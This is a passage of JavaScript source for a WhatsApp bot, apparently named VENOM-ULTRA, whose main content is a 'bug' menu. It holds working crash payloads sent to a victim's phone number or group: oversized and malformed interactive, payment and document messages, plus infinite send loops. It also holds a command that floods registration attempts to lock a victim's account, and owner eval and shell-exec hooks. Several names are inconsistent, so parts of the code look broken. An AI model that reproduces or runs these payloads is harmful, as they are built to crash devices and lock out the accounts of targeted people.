case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
VorTexXNoNaMeTECH_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await VorTexXNoNaMeTECH.sendMessage(m.chat, { audio:  VorTexXNoNaMeTECH_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case "xandroid": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VorTexXNoNaMeTECHInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "254746312570") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VorTexXNoNaMeTECHInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "254746312570") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the bot only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xandroid2":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the bot only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xgc":
  {
    if (!isPremium) return replyglobal(mess.prem)
    if (!text) {
      return replyglobal("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replyglobal("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replyglobal("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await GlobalTechInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replyglobal("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      GlobalTechInc.groupLeave(groupTarget);
    } catch (error) {
      replyglobal(util.format(error));
    }
  }
  break;
  case "🙂":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the bot only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "systemuicrash": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VorTexXNoNaMeTECHInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "254746312570") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VorTexXNoNaMeTECHInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "254746312570") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case 'oneshot': {
	if (!isCreator) return replyglobal(mess.owner)
if (!text) return replyglobal(`Usage .${command} 22959778549`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 22959778549`)
var contactInfo = await VorTexXNoNaMeTECHInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "254746312570") {
    return;
    }
    if (cleanedNumber == "254746312570") {
    return;
    }
    if (cleanedNumber == "254746312570") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function venomIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await VorTexXNoNaMeTECHInc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '#BIL MD CRASH ☠️🔥',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '#BIL MD CRASH ☠️🔥',
								title: '#BIL MD CRASH ☠️🔥',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"#BIL MD CRASH ☠️🔥","key":"+923444844060","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await GlobalTechInc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '#BIL MD CRASH ☠️🔥',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await replyglobal(`In process....`)
            await xeonIosShot(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
            }
            
				break;
				case 'xpayment': {
					if (!isPremium) return replyglobal(mess.prem)
if (!text) return replyglobal(`Usage .${command} 22959778549`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 22959778549`)
var contactInfo = await VorTexXNoNaMeTECHInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "22959778549") {
    return;
    }
    if (cleanedNumber == "22959778549") {
    return;
    }
    if (cleanedNumber == "22958897642") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function venomBugPay(jid){
				await VorTexXNoNaMeTECHInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+923444844060","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await venomBugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
				}
				break;
		case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPremium) return replyglobal(mess.prem)
if (!q) return replyglobal(`Usage .${command} 22959778549`)
let venomyvictim = q.replace(/[^0-9]/g, "")
if (venomyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
let target = xeonyvictim + '@s.whatsapp.net'
await replyglobal(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await venomkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationvenomy(target, force)
}
await replyglobal(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
}
break
case 'ioskill': case 'iosx': {
            	if (!isPremium) return replyglobal(mess.prem)
let venomyvictim = q.replace(/[^0-9]/g, "")
if (venomyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
await replyglobal(`In process....`)
let target = venomyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'xfreeze': case 'xblankscrn': {
	if (!isPremium) return replyglobal(mess.prem)
	const XeonDoc = {
    url: "./80/x.mp3"
};
async function xeonFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await VorTexXNoNaMeTECHInc.sendMessage(jid, {
    'document': VenomDoc,
    'fileName': "🦄드림 가이 Venom" + Venomtext1,
    'mimetype': "application/zip",
    'caption': "🦄드림 가이 Venom" + Venomtext1,
    'pageCount': 0x3b9aca00,
    'contactVcard': true
});
}
}

await venomFreeze(m.chat);
	}
	break
	case 'xkillgc': case 'xblankscrn': case 'xwebgc': {
		if (!isPremium) return replyglobal(mess.prem)
		const venomimage = {
    title: "🦄드림 가이 Venom; ",
    hasMediaAttachment: true,
    imageMessage: thumb.imageMessage
};

const xtext = {
    text: ''
};

VorTexXNoNaMeTECHInc.relayMessage(m.chat, {
    'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': venomimage,
                'body': xtext,
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': "galaxy_message",
                        'buttonParamsJson': JSON.stringify({
                            'header': "🦄드림 가이 venom; ",
                            'body': "xxx",
                            'flow_action': "navigate",
                            'flow_action_payload': {
                                'screen': "FORM_SCREEN"
                            },
                            'flow_cta': "xxxxx",
                            'flow_id': "1169834181134583",
                            'flow_message_version': '3',
                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                    }],
                    'messageParamsJson': ''
                },
                'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': m.chat,
                    'quotedMessage': {
                        'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/pdf",
                            'title': "crash",
                            'pageCount': 0x3b9aca00,
                            'fileName': "crash.pdf",
                            'contactVcard': true
                        }
                    },
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120363222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "🦄드림 가이 Venom"
                    }
                }
            }
        }
    }
}, {});
		}
		break
		case 'xiosfreeze': case 'xioshot':{
			if (!isPremium) return replyglobal(mess.prem)
			const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
			async function XeonyCrashyIos(dgxeon, chat, participant) {
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🦄드림 가이 Venom${venomtext11}`,
      caption: `🦄드림 가이 Venom ${venomtext11}`,
    },
    { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
  );
}
  async function executeIosAttack() {
    if (!args[0]) amount = `99`;
    for (let i = 1; i < 10; i++) {
      VenomyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
      
    }
    }
            await executeIosAttack();
            }
    break;
case 'lockotp': case 'tempban': {
	if (!isPremium) return replyglobal(mess.prem)
  if (args.length < 1) return replyglobal(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replyglobal(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const venomCountryCode = args2[0];
  const xtarget = args2[1];
  const venomNumber = xtarget.replace('@s.whatsapp.net', '');
  const venommerge = `${xeonCountryCode}${xtarget}`
  const venomMention = xeonmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + xeonMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [xeonMention]
  );
  try {
    const { stateVenom, saveCredsVenom } = await useMultiFileAuthState('./session');
    const xeonRequest = await VorTexXNoNaMeTECHInc.requestRegistrationCode({
      phoneNumber: '+' + venomCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: venomCountryCode,
      phoneNumberNationalNumber: `${venomNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var venomPrefix = Math.floor(Math.random() * 999);
      var venomSuffix = Math.floor(Math.random() * 999);
      await VorTexXNoNaMeTECHInc.register(`${venomPrefix}-${venomSuffix}`);
    } catch (err) {
      console.log(`${venomPrefix}-${venomSuffix}`);
    }
  }
}
break;

case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replyglobal(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyglobal(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return VorTexXNoNaMeTECHInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return VorTexXNoNaMeTECHInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            case 'menu':
            case 'help':
            case 'alive':
            case '?':
            case 'allmenu':
                let xeonmenuoh = `Hello ${pushname}
╰┈➤ ${xeonytimewisher} 😄
${readmore}. 
╭━━━━━━☠️◁️🕷️ VÊÑÔM-ÚĻȚŘÁ_V9━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ☠️✞Vðr†êx 𝚴𝚯 𝚴𝚫𝚳𝚵 𝚻𝚵𝐂𝚮™✞︎ 🐥👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ 9.4.2 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_  VENOM-ULTRA - V҉ 9🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${pushtime} ⏰🔋
╰━━━━━━☠️◁️━━━━━━╯
*Hard bug ☣️⚠️⚠️*

   → venomspie
   → venomlock
   → Spam-pairing
   → Bug_zip
   → Bug_Channel
   → Bugspam
   → Bug-Gc
   → Bug-iOS 
   → Deletebug 
   → Venomcrash
   → Venomkick
   → Venomattack


╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
> xandroid 
> xandroid2
> systemuicrash
> xsysui
> xpayment
> oneshot
> onekill
> xfreeze

╰┈➤ ʙᴜɢ ᴡᴇʙ
> xfreeze
> xblankscrn
> xwebgc

╰┈➤ ʙᴜɢ ɪᴏꜱ
> xios
> xios2
> ioskill
> xiosfreeze
> xioshot

╰┈➤ ʙᴜɢ ᴏᴛʜᴇʀ
> tempban
> lockotp

╰┈➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
> webgc
> androgc
> iosgc
> xjpmgc

╰┈➤ ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ
> banv1
> banv2
> banv3
> banv4
> banv5
> banv6
> unbanv1
> unbanv2
> unbanv3
> unbanv4
> unbanv5

╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
> getsession
> deletesession
> join
> shutdown  
> restart
> autoread *[option]*
> autotyping *[option]*
> autorecording *[option]*
> autorecordtyp *[option]*
> autobio *[option]*
> autoswview *[option]*
> mode *[option]*
> block
> unblock 
> backup
> getcase
> addowner
> delowner

╰┈➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
> closetime
> opentime
> kick
> add
> promote
> demote
> setdesc
> setppgc
> tagall
> hidetag
> totag
> group *[option]*
> editinfo
> linkgc
> revoke
> listonline

╰┈➤ ᴍᴀɪɴ ᴍᴇɴᴜ
> menu
> buypremium
> runtime
> script
> donate
> owner

╰┈➤ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ
> sticker
> smeme
> take
> toimage
> tovideo
> toaudio
> tomp3
> tovn
> togif
> tourl
> toqr
> toviewonce
> fliptext
> emojimix

╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
> addvideo
> addimage
> addsticker
> addvn
> addzip
> addapk
> addpdf
> delvideo
> delimage
> delsticker
> delvn
> delzip
> delapk
> delpdf
> listvideo
> listimage
> liststicker
> listvn
> listzip
> listapk
> listpdf

╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ
> play
> ytmp3
> ytmp4
> sound1 - sound161`
if (typemenu === 'v1') {
                    VorTexXNoNaMeTECHInc.sendMessage(m.chat, {
                        text: venommenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/hFFgCL2/qris.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    VorTexXNoNaMeTECHInc.sendMessage(m.chat, {
      video: fs.readFileSync('./GlobalMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: venommenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/1mr4Y16/anjay.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                   VorTexXNoNaMeTECHInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./GlobalMedia/thumb2.mp4'),
                        caption: venommenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VorTexXNoNaMeTECHInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: venommenuoh
                        }
                    }, {})
                }
                break
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replyglobal(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replyglobal('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				GlobalTechInc.sendMessage(m.sender, { sticker: { url: venomresources[i].url }})
			}
		} else {
			for (let i = 0; i < venomresources.length; i++) {
				GlobalTechInc.sendMessage(m.chat, { sticker: { url: venomresources[i].url }})
			}
		}
	} else replyglobal(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyglobal(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyglobal(bang)
                    }
                    try {
                        replyglobal(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyglobal(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyglobal(evaled)
                    } catch (err) {
                        await replyglobal(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyglobal(err)
                        if (stdout) return replyglobal(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
